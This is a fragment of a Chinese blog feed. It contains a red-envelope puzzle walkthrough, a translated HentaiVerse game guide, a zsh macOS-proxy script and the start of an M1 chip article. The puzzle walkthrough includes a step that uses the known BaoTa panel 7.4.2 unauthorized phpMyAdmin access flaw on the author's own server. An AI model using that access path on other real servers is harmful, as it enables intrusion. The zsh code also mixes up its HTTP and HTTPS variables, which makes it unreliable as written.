(ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 